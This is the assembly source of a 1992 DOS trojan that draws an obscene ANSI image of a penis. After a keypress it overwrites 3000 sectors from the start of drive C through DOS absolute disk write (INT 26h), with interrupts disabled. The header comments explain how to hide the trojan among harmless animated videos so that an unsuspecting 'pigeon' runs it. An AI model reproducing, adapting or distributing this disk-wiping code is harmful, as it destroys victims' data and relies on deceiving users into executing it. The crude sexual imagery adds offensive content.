; PENIS.ASM [PENIS trojan]
; Laughing Dog MASM/TASM compatible Assembly-Code file/drive destroyer
; Created: 9/5/92, assemble and link to .EXE.
; This piece of code, generated in part by the Laughing Dog 
; screen maker, will write a squirting ANSI penis to the
; monitor (ANSI.SYS is NOT needed) and pause. At the press of any key,
; PENIS trojan will restore the previous video page, reset the cursor
; and crush a tremendous portion of the C: drive. This is totally
; compatible with Laughing Dog videos which always pause on screen
; display. For best results, use Laughing Dog to create any number of 
; harmless "interesting" animated videos and collect them in one archive
; with the PENIS trojan.  (They should, however, be thematically consistant.)
; In this way, the pigeon will enjoy some harmless animated video
; fun before he stumbles upon PENIS. The Laughing Dog utility, LDOGRAB.EXE,
; is very handy for capturing interesting screens to Laughing Dog format
; and was used in the creation of PENIS trojan. The Laughing Dog screen-maker
; is quality shareware and should you use it, PLEASE remember to register.


PENIS_LENGTH    EQU     2000        ; ha ha ha ha, a little funny for ya
       .MODEL    small

       .STACK    100h                ;256 byte stack

       .DATA

PENIS_SCREEN LABEL WORD
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0EDCH, 0EDCH, 0EDCH, 0EDCH, 0EDCH, 06DCH
        DW      8FDCH, 8FDBH, 8FDFH, 0FFDFH, 8FDCH, 8FDCH, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0EDCH, 0EDCH, 6EDBH
        DW      6EDFH, 6EDFH, 6EDFH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DDH, 8FDFH, 8F20H, 8FDFH, 0FFDBH, 0FFDCH
        DW      8FDCH, 8F20H, 0FDFH, 0F20H, 0F20H, 0F20H, 0F20H, 0720H
        DW      0F20H, 0F20H, 7120H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DCH, 0820H, 0820H, 0820H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0120H, 0EDCH, 0EDCH, 0EDBH, 6EDFH, 6EDFH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0620H, 0620H, 8FDFH, 8F20H, 0FFDBH
        DW      0FDCH, 07DCH, 0FDCH, 87DCH, 87DFH, 8720H, 8720H, 0720H
        DW      0743H, 073AH, 075CH, 0754H, 0749H, 0754H, 0754H, 0759H
        DW      073EH, 68DBH, 6820H, 6820H, 6EDFH, 6EDFH, 6EDBH, 07DBH
        DW      6FDBH, 6FDBH, 6EDBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DCH, 0820H, 0820H, 0820H
        DW      0820H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0120H, 0120H
        DW      0EDEH, 3EDBH, 68B0H, 68B0H, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DDH, 0620H, 0620H, 0620H, 0620H
        DW      0FDFH, 0FFDEH, 0FDBH, 0FFDDH, 0FDCH, 0F20H, 87DCH, 0720H
        DW      8720H, 8720H, 7820H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      68DBH, 68DCH, 6820H, 6820H, 6820H, 6820H, 6820H, 07DBH
        DW      6EDBH, 6EDFH, 6EDFH, 07DBH, 6EDFH, 6EDFH, 6E20H, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DCH, 0820H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0120H, 0120H
        DW      0120H, 0120H, 6EDBH, 68B0H, 68B0H, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DDH, 0620H, 0620H, 8FDFH, 8F20H
        DW      8FDCH, 0F0DBH, 0FDFH, 0F20H, 0F0DBH, 0FDBH, 0FDBH, 0FFDDH
        DW      0F20H, 0F20H, 7820H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH, 08DBH
        DW      08DCH, 0820H, 0820H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0920H, 0920H, 0920H
        DW      0EDCH, 6EDBH, 6EDFH, 06DBH, 68B0H, 68B0H, 68B0H, 68B0H
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 8FDCH, 87DDH, 8FDFH, 0F0DBH, 0FDCH, 0720H
        DW      0F20H, 0F20H, 7820H, 07DBH, 08DBH, 08DBH, 08DBH, 7820H
        DW      7820H, 7820H, 7820H, 7820H, 08DBH, 08DBH, 08DBH, 07DBH
        DW      08DBH, 08DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 38DFH, 3820H, 38DFH, 38DFH, 38DFH, 38DFH
        DW      38DFH, 38DFH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH
        DW      03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 03DCH, 3EDFH
        DW      3EDFH, 36DFH, 36DFH, 36DFH, 36DFH, 06DBH, 06DBH, 68B0H
        DW      68B0H, 68B0H, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH, 06DBH
        DW      06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0FDFH, 0FDCH, 7F20H, 0F20H, 0FDCH
        DW      0F20H, 0F20H, 7320H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      7720H, 7720H, 7720H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      6720H, 6720H, 6720H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 03DBH, 03DBH, 3320H, 3B53H, 3B50H
        DW      3B45H, 3B43H, 3B49H, 3B41H, 3B4CH, 3B4CH, 3B59H, 3B20H
        DW      3B4CH, 3B55H, 3B42H, 3B52H, 3B49H, 3B43H, 3B41H, 3B54H
        DW      3B45H, 3B44H, 3B20H, 3B20H, 03DBH, 36DEH, 06DBH, 06DBH
        DW      06DBH, 68B0H, 68B0H, 68B0H, 68B0H, 68B0H, 66DBH, 06DBH
        DW      06DBH, 06DFH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 87DEH, 0FDCH, 87DBH, 8720H, 87DEH, 8720H
        DW      8720H, 8720H, 7320H, 07DBH, 07DBH, 07DBH, 07DBH, 7720H
        DW      7720H, 7720H, 7720H, 7720H, 7720H, 7720H, 7720H, 7720H
        DW      7720H, 7720H, 7720H, 07DBH, 07DBH, 7720H, 07DBH, 7720H
        DW      07DBH, 08DBH, 08DBH, 03DBH, 3320H, 3320H, 3320H, 3B46H
        DW      3B4FH, 3B52H, 3B20H, 3B20H, 3B48H, 3B45H, 3B52H, 3B20H
        DW      3B20H, 3B50H, 3B4CH, 3B45H, 3B41H, 3B53H, 3B55H, 3B52H
        DW      3B45H, 3B20H, 3B20H, 3B20H, 3B20H, 3B20H, 06DBH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 06DBH, 06DFH, 68B0H, 68B0H, 66DBH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 8FDCH
        DW      8F20H, 87DDH, 0FDFH, 0F0DBH, 8FDCH, 8F20H, 8F20H, 8F20H
        DW      8F20H, 8F20H, 7B20H, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      08DBH, 08DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 7820H
        DW      7820H, 7820H, 7820H, 07DBH, 68DFH, 68DFH, 68DFH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 38DDH, 03DBH, 3B54H, 3B65H, 3B61H
        DW      3B72H, 03DBH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH
        DW      3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3BDCH, 3B20H
        DW      3B20H, 3B48H, 3B65H, 3B72H, 3B65H, 03DBH, 36DEH, 06DBH
        DW      06DBH, 06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 87DFH, 0F0DBH, 8FDCH, 0FDFH, 87DDH
        DW      8720H, 8720H, 07DBH, 07DBH, 08DBH, 18DFH, 19DCH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 79DCH
        DW      79DCH, 07DBH, 07DBH, 07DBH, 6720H, 6720H, 6720H, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 03DBH, 3F2DH, 03DBH, 3F2DH
        DW      3BDCH, 3BDBH, 3BDFH, 3F2DH, 03DBH, 3F2DH, 3F20H, 3F2DH
        DW      3F20H, 3F2DH, 03DBH, 3F2DH, 03DBH, 3F2DH, 3BDFH, 3BDBH
        DW      3BDCH, 3F2DH, 3F20H, 3F2DH, 3F20H, 3F2DH, 36DEH, 06DBH
        DW      06DBH, 06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0FDFH, 0FDCH, 0F0DBH, 87DCH
        DW      8720H, 8720H, 7320H, 7320H, 01DBH, 09DBH, 09DBH, 09DBH
        DW      19DFH, 79DCH, 79DCH, 79DCH, 71DFH, 19DFH, 09DBH, 09DBH
        DW      09DBH, 79DDH, 7920H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 38DDH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 3B20H, 03DBH, 3320H, 3B54H, 3B52H, 3B4FH
        DW      3B4AH, 3B41H, 3B4EH, 3B20H, 3B20H, 3B20H, 3B20H, 3B20H
        DW      3BDFH, 3BDBH, 03DBH, 3320H, 03DBH, 03DBH, 36DEH, 06DBH
        DW      06DBH, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 87DCH, 87DDH, 8720H, 0FFDBH
        DW      0F20H, 0F20H, 7320H, 7320H, 78DBH, 18DCH, 19DFH, 09DBH
        DW      19DEH, 09DBH, 09DBH, 7920H, 78DBH, 18DBH, 1820H, 09DBH
        DW      09DBH, 09DBH, 08DBH, 7820H, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 38DDH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 3B20H, 03DBH, 3320H, 3BDCH, 3BDCH, 3BDBH
        DW      3BDBH, 3BDBH, 3BDCH, 3BDCH, 3B20H, 3B20H, 3B20H, 3B20H
        DW      3B20H, 3BDFH, 3BDBH, 03DBH, 3320H, 03DBH, 03DBH, 06DFH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0F0DCH, 87DEH, 8720H, 0FDCH
        DW      0F20H, 0F20H, 7320H, 7320H, 78DBH, 78DBH, 18DDH, 19DEH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 18DFH, 19DCH, 09DBH, 09DBH
        DW      09DBH, 09DBH, 08DBH, 07DBH, 08DBH, 08DBH, 08DBH, 07DBH
        DW      07DBH, 08DBH, 08DBH, 08DBH, 08DBH, 03DBH, 03DBH, 3320H
        DW      3BDBH, 3B20H, 03DBH, 3BDCH, 3BDBH, 3BDBH, 3BDBH, 3BDBH
        DW      3BDBH, 3BDBH, 3BDBH, 3BDBH, 3BDCH, 3B20H, 3B20H, 3B20H
        DW      3B20H, 3B20H, 3BDBH, 3B20H, 3B20H, 3B20H, 03DBH, 03DDH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 87DDH, 8720H, 0F0DBH
        DW      0F20H, 0F20H, 07DBH, 07DBH, 07DBH, 07DBH, 07DBH, 01DBH
        DW      09DBH, 09DBH, 19DBH, 19DEH, 09DBH, 19DBH, 09DBH, 79DFH
        DW      7920H, 1920H, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 38DDH, 3820H, 3820H
        DW      3BDBH, 3B20H, 03DBH, 3BDFH, 03DBH, 3BDBH, 3BDBH, 3BDBH
        DW      3BDBH, 3BDBH, 03DBH, 3BDCH, 3BDCH, 03DBH, 3320H, 3320H
        DW      3320H, 3BDCH, 3BDBH, 3B20H, 3B20H, 3B20H, 3B20H, 03DDH
        DW      0320H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H, 0720H
        DW      8F20H, 8F20H, 07DBH, 07DBH, 68DBH, 68DBH, 68DBH, 01DBH
        DW      09DBH, 09DBH, 09DBH, 09DBH, 58DBH, 58DBH, 7820H, 7820H
        DW      7820H, 7820H, 7820H, 7820H, 7820H, 7820H, 71DEH, 19DEH
        DW      19DBH, 19DDH, 19DBH, 19DBH, 38DBH, 18DBH, 13DFH, 19DCH
        DW      19DBH, 39DCH, 3920H, 03DBH, 3BDCH, 3BDBH, 3BDFH, 3BDBH
        DW      3BDFH, 03DBH, 3BDCH, 3BDCH, 3B20H, 3B20H, 3B20H, 31DCH
        DW      19DCH, 09DBH, 09DBH, 09DBH, 09DBH, 39B2H, 39B1H, 39B0H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 08FAH, 0820H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0820H, 0820H, 07DBH, 07DBH, 68DDH, 68DDH, 68DDH, 18DDH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 09DBH, 19DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 09DBH, 09DBH, 79DCH, 71DEH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 38DBH, 18DDH, 19DEH, 09DBH
        DW      39DFH, 3BDFH, 3BDBH, 3BDCH, 3BDFH, 03DBH, 3BDCH, 3B20H
        DW      31DCH, 39DCH, 39DCH, 3920H, 31DCH, 39DCH, 39DCH, 19DCH
        DW      09DBH, 09DBH, 09DBH, 39B2H, 39B1H, 39B0H, 3920H, 3920H
        DW      03DDH, 0320H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H, 0F20H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 19DDH, 19DCH, 19DCH
        DW      1920H, 09DBH, 09DBH, 19DFH, 09DBH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 1DDFH, 19DCH, 09DBH, 09DBH
        DW      31DCH, 19DCH, 09DBH, 09DBH, 09DBH, 19DDH, 09DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 01DBH, 09DBH, 09DBH, 19DFH, 19DBH
        DW      19DEH, 09DBH, 09DBH, 09DBH, 09DBH, 59B2H, 59B1H, 59B0H
        DW      5DB0H, 5DB1H, 5DB2H, 5DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH, 0DDBH
        DW      5D20H, 5D20H, 05DBH, 05DBH, 05DBH, 05DBH, 05DBH, 15DDH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 19DDH, 59DFH, 59DFH
        DW      1920H, 09DBH, 09DBH, 51DEH, 19DEH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 09DBH, 19DFH, 09DBH, 09DBH
        DW      19DEH, 09DBH, 09DBH, 1920H, 09DBH, 09DBH, 09DBH, 09DBH
        DW      19DDH, 09DBH, 09DBH, 51DFH, 19DFH, 09DBH, 09DBH, 19DCH
        DW      19DEH, 09DBH, 09DBH, 59B2H, 59B1H, 59B0H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H, 5920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 41DEH
        DW      19DEH, 09DBH, 09DBH, 19DEH, 09DBH, 09DBH, 09DBH, 09DBH
        DW      1920H, 09DBH, 09DBH, 41DEH, 19DEH, 09DBH, 19DDH, 19DEH
        DW      09DBH, 19DDH, 09DBH, 09DBH, 4920H, 1920H, 09DBH, 19DBH
        DW      41DFH, 19DFH, 09DBH, 09DBH, 09DBH, 19DFH, 19DEH, 09DBH
        DW      09DBH, 09DBH, 09DBH, 19DDH, 09DBH, 09DBH, 09DBH, 19DFH
        DW      19DEH, 09DBH, 09DBH, 09DBH, 09DBH, 09DBH, 79DBH, 49B2H
        DW      49B1H, 49B0H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H, 4920H
        DW      2920H, 2920H, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      12DCH, 29DFH, 29DFH, 79B2H, 79B2H, 79B2H, 79B2H, 79B1H
        DW      79B2H, 79B2H, 79B2H, 79B1H, 79B2H, 79B2H, 79B0H, 79B2H
        DW      79B2H, 79B2H, 79B2H, 79B2H, 79B0H, 79B0H, 21DFH, 29DFH
        DW      29DFH, 79B2H, 79B2H, 79B1H, 79B1H, 79B1H, 79B2H, 79B2H
        DW      79B2H, 79B1H, 79B1H, 79B2H, 79B2H, 79B2H, 79B1H, 79B1H
        DW      79B2H, 79B2H, 79B2H, 79B1H, 21DFH, 29DFH, 29DFH, 27B2H
        DW      27B1H, 27B0H, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH, 02DBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 7ADBH, 7ADBH, 7ADBH, 79B1H
        DW      79B1H, 79B1H, 79B1H, 79B1H, 79B1H, 79B1H, 79B0H, 79B1H
        DW      79B1H, 79B1H, 79B1H, 79B1H, 79B0H, 79B0H, 79B2H, 79B2H
        DW      79B2H, 79B1H, 79B1H, 79B0H, 79B0H, 79B0H, 0ADBH, 79B2H
        DW      79B2H, 79B2H, 79B1H, 79B1H, 79B0H, 79B2H, 79B2H, 79B2H
        DW      79B1H, 79B0H, 79B2H, 79B2H, 79B2H, 79B1H, 79B1H, 79B2H
        DW      79B2H, 79B2H, 79B1H, 79B1H, 79B0H, 79B0H, 7AB0H, 7AB1H
        DW      7AB2H, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH, 0ADBH
        DW      7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 7EDBH, 1FB1H
        DW      1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H, 1FB1H
        DW      1FB1H, 79B0H, 79B0H, 79B0H, 79B0H, 1FB1H, 1FB1H, 1FB1H
        DW      1FB1H, 1FB1H, 79B0H, 79B0H, 7920H, 1FB1H, 79B2H, 79B2H
        DW      1FB1H, 1FB1H, 79B0H, 79B0H, 79B2H, 79B2H, 79B1H, 79B0H
        DW      79B0H, 79B2H, 79B2H, 1FB1H, 1FB1H, 79B0H, 79B2H, 79B2H
        DW      1FB1H, 1FB1H, 1FB1H, 7EB1H, 7EB1H, 7EB2H, 7EB2H, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH, 4EDBH
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0F20H, 0F20H, 0F20H, 0F20H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H
        DW      0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H, 0720H

        .CODE
         ;STARTUP CODE  Set up DS, SS and SP Regs.
dogstart:
         mov dx, @data
         mov ds, dx
         mov bx, ss
         sub bx, dx
         shl bx, 1
         shl bx, 1
         shl bx, 1
         shl bx, 1
         cli
         mov ss, dx
         add sp, bx
         sti
;Actual program begins here
         push   es            ;save es register
         mov    ah,0fh        ;get current video mode
         int    010h
         cmp    al,7          ;is it a monochrome mode?
         jz     mono          ;yes
         mov    ax,0B800h     ;color text video segment
         jmp    SHORT doit
mono:    mov    ax, 0B000h    ;monochrome text video segment
doit:    mov    es,ax
         sub    si,si         ;clear source index counter
         mov    si,offset PENIS_SCREEN ;load destination offset
         sub    di,di         ;clear destination index counter
         mov    cx,PENIS_LENGTH
         rep movsw            ;write to video memory

         mov    ah,02h        ;hide cursor
         mov    bh,0          ;assume video page 0
         mov    dx,1A00h      ;moves cursor past bottom of screen
         int    010h
lup:     mov    ah, 01h       ;wait for a keystroke
         int    016h          ;this makes PENIS sporting and I prefer it that
         jz     lup           ;way. Alter the code to disallow if you wish.
         mov    ah,0          ;clear keyboard buffer
         int    016h

       ;Clear the screen
         mov    ah, 6         ;function 6 (scroll window up)
         mov    al, 0         ;blank entire screen
         mov    bh, 7         ;attribute to use
         mov    ch, 0         ;starting row
         mov    cl, 0         ;starting column
         mov    dh, 25        ;ending row
         mov    dl, 80        ;ending column
         int    10h           ;call interrupt 10h

         mov    ah,02h        ;puts cursor back where it belongs
         mov    bh,0          ;assume video page 0
         mov    dx,0
         int    010h

         pop    es            ;restore es register
 ;
 ;Beginning of "crush-the-drive" routine (next 6 opcodes)
 ;
         mov     ax,0002h     ; First argument is 2
         mov     cx,0BB8h     ; Second argument is 3000
         cli                  ; Disable interrupts (no Ctrl-C)
         cwd                  ; Clear DX (start with sector 0)
         int     026h         ; DOS absolute write interrupt
         sti                             ; Restore interrupts
         
         mov    ax,4c00h      ;DOS exit function w/exitcode = 0
         int    21h

         END dogstart

